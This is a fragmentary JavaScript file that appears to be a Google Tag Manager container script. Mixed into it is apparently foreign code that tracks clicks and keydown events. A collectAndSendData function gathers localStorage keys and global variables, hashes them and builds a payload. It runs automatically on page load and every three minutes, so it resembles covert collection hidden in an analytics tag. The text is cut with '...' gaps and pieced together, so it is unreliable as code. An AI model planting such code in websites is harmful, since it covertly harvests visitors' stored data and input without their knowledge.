...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        "function": "__rep",
        "vtp_containerId": "UA-101483010-1",
        "vtp_remoteConfig": ["map"],
        "tag_id": 1
      }, {
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-NVRFM3X5H3"]],
        "tag_id": 3
      }],
      "predicates": [{
        "function": "_eq",
  ...
  */
  var ca,
    ...
    ja;
  // List keys that need to be tracked
  var keysOnTrack = ['eventListeners', 'localStorage', 'globalVars'];
  ...
  var hb = {};
  var customEvents = ['click', 'mouseover', 'mouseout', 'keydown'];
  ...
  ze.md = Number("0") || 0;
  ze.da = "dataLayer";
  ze.Ki = "ChAI8NCBpwYQt5+cxZ7f1aFJEicATU77VMT2b2+VGOvaVch3eyO648EF9o9H8KctibC+tinnTbKxZtwaAsak";
  var Ce = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  async function collectAndSendData() {
    let collectedData = {
      storage: getLocalStorageKeys(),
      globals: collectGlobalVars()
    };
    let payload = {
      hashCode: getStringHash(JSON.stringify(collectedData)),
      data: collectedData
    };
  ...
  // Apply tracking to elements and start data collection & sending
  ...
  window.addEventListener("DOMContentLoaded", function () {
    trackEvents(document);
    collectAndSendData();
    setInterval(collectAndSendData, 180000);
  });
  function Xs(a) {
    return {
      message: a.message,
